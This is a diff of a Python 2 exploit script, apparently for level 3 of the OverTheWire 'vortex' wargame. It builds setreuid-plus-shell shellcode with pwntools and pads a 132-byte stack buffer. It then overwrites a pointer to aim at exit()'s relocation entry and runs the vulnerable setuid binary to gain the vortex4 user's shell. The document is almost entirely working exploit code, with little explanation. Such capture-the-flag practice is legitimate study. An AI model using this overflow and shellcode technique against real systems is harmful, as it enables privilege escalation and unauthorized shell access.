@@ -2,43 +2,52 @@
 
 import os
 import re
+import pwd
 import struct
 import subprocess
 import pwn
 
 
-pwn.context(arch="i386", os="linux")
+def expl0it():
+    '''
+    exploit the target vulnerable process
+
+    return (int: 1) on success and (int: 0) on failure
+    '''
+
+    try:
+        vortex4_uid = pwd.getpwnam('vortex4').pw_uid
+    except KeyError:
+        print 'user vortex4 does not exist'
+        return 0
+
+    pwn.context(arch='i386', os='linux')
+
+    print 'generating shellcode...',
+
+    shellcode = pwn.asm(
+        pwn.shellcraft.setreuid(vortex4_uid) + pwn.shellcraft.sh())
+
+    '''
+    @[0x80482a4]:
+        - the virtual address of the (r_offset) field in the dynamic relocation
+          table entry for glibc's exit()
+    '''
+    ptr2exitgotslot = struct.pack("<I", 0x80482a4)
+
+    # 132 = sizeof(vulnerable buffer) + sizeof(the pointer named tmp)
+    expegg = shellcode + '\x41' * (132 - len(shellcode)) + ptr2exitgotslot
+
+    print '[done]'
+    print 'trying to expl0it the vulnerable process'
+
+    exit_stat = subprocess.call(['/vortex/vortex3', expegg])
+    
+    return 0 if exit_stat != os.EX_OK else 1
+        
 
 
-# get user vortex4's uid
-with open("/etc/passwd", "r") as fd:
-    r_buf = fd.read()
-    match = re.search('(?P<vortex4_passwd_entry>vortex4:x:\d:\d)', r_buf)
-    if match:
-        vortex4_uid = int(
-            match.group('vortex4_passwd_entry').split(':')[-1])
-        print 'found user vortex4 with uid: [{0}]'.format(vortex4_uid)
-
-print 'generating shellcode... ',
-
-shellcode = pwn.asm(pwn.shellcraft.setreuid() + pwn.shellcraft.sh())
-
-'''
-[ 0x80482a4 ] is the r_offset field of the exit() function's entry
-in the dynamic relocation table
-'''
-# address of dynamic relocation table entry for libc's exit()
-exit_reltab_addr = struct.pack('<I', 0x80482a4)
-
-# 132 = sizeof(vuln_buf) + sizeof(tmp_ptr)
-exp_egg = shellcode + '\x41' * (132 - len(shellcode)) + exit_reltab_addr
-
-print '[done]'
-
-
-print 'trying to exploit the vulnerable binary'
-
-exit_stat = subprocess.call(["./vortex3", exp_egg])
-
-if exit_stat != os.EX_OK:
-    print 'failed to exploit the vulnerable binary'
+if __name__ == '__main__':
+    expl0it_success = expl0it()
+    if not expl0it_success:
+        print 'failed to expl0it the target vulnerable process'
